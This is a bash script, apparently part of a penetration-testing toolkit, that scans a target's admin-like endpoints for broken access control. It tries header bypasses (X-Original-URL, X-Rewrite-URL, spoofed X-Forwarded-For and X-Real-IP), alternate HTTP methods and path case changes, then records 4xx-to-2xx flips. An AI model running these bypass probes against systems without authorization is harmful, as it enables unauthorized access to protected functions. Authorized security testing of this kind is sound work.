#!/usr/bin/env bash
# vuln/broken-access.sh — Broken Access Control sweep.
#
# Method (XSSRat 00x10-03):
#   1. Build endpoint table with role per endpoint (admin / user / guest)
#   2. For each protected endpoint, try:
#        - X-Original-URL bypass header
#        - X-Rewrite-URL bypass header
#        - X-Forwarded-For: 127.0.0.1
#        - HTTP method override
#        - Case manipulation in path
#        - Trailing slash, double slashes
#        - Path traversal (../../admin)
#   3. Replay with lower-privilege auth and compare response

PHASE="broken-access"
. "$(dirname "$0")/_lib.sh"
require_target
ensure_scope
OUTDIR=$(out_dir "$PHASE")

# Either user provides a list of admin-protected endpoints, or we
# heuristic-derive from crawl output.
ADMIN_URLS="${ADMIN_URLS:-}"
if [ -z "$ADMIN_URLS" ]; then
    URLS=$(resolve_urls_input)
    [ -z "$URLS" ] && { log ERR "no URL corpus"; exit 5; }
    ADMIN_URLS="$OUTDIR/admin-candidates.txt"
    grep -iE '(/admin|/manage|/console|/dashboard|/internal|/api/users|/api/admin)' "$URLS" \
        | sort -u > "$ADMIN_URLS"
fi
[ ! -s "$ADMIN_URLS" ] && { log ERR "no admin candidates"; exit 5; }

REPORT="$OUTDIR/findings.csv"
echo "url,bypass_vector,status,len,confidence" > "$REPORT"

# Standard bypass vector library
declare -A BYPASSES=(
    ['X-Original-URL']='X-Original-URL: /admin'
    ['X-Rewrite-URL']='X-Rewrite-URL: /admin'
    ['X-Forwarded-For']='X-Forwarded-For: 127.0.0.1'
    ['X-Real-IP']='X-Real-IP: 127.0.0.1'
    ['X-HTTP-Method-Override-DELETE']='X-HTTP-Method-Override: DELETE'
    ['Referer-Admin']='Referer: https://target/admin'
)

# Get the baseline response code on each admin endpoint as unauth user
log INFO "probing $(wc -l < "$ADMIN_URLS") admin candidates with $((${#BYPASSES[@]} + 4)) vectors each"
while read -r u; do
    [ -z "$u" ] && continue
    base=$(curl -sI --max-time 8 "$u" 2>/dev/null | head -1 | awk '{print $2}')
    [ -z "$base" ] && continue

    # If baseline is already 200, no need to try bypasses
    [[ "$base" == 2* ]] && { echo "$u,baseline-already-open,$base,?,0" >> "$REPORT"; continue; }

    # Header-based bypasses
    for name in "${!BYPASSES[@]}"; do
        hdr="${BYPASSES[$name]}"
        # Replace `/admin` placeholder with the actual path component
        path=$(echo "$u" | awk -F/ '{print "/" $4 (NF>=5 ? "/" $5 : "")}')
        hdr_replaced=$(echo "$hdr" | sed "s|/admin|$path|")
        result=$(curl -sI --max-time 8 -H "$hdr_replaced" "$u" 2>/dev/null \
            | head -1 | awk '{print $2}')
        if [[ "$result" == 2* ]] && [[ "$base" == 4* ]]; then
            log INFO "BAC BYPASS ($name): $u  $base → $result"
            echo "$u,$name,$result,?,85" >> "$REPORT"
        fi
    done

    # Method override (POST→GET on protected resources)
    for m in PUT PATCH DELETE OPTIONS; do
        result=$(curl -sI --max-time 8 -X "$m" "$u" 2>/dev/null | head -1 | awk '{print $2}')
        if [[ "$result" == 2* ]] && [[ "$base" == 4* ]]; then
            log INFO "BAC METHOD ($m): $u  $base → $result"
            echo "$u,method-$m,$result,?,75" >> "$REPORT"
        fi
    done

    # Path case manipulation (/Admin vs /admin)
    case_u=$(echo "$u" | sed 's|/admin|/Admin|; s|/manage|/Manage|')
    result=$(curl -sI --max-time 8 "$case_u" 2>/dev/null | head -1 | awk '{print $2}')
    if [[ "$result" == 2* ]] && [[ "$base" == 4* ]]; then
        log INFO "BAC CASE: $case_u  $base → $result"
        echo "$case_u,case-manip,$result,?,70" >> "$REPORT"
    fi
done < "$ADMIN_URLS"

n=$(awk -F, 'NR>1 && $5 >= 70' "$REPORT" | wc -l)
log INFO "broken-access done — $n high-confidence BAC bypasses in $REPORT"
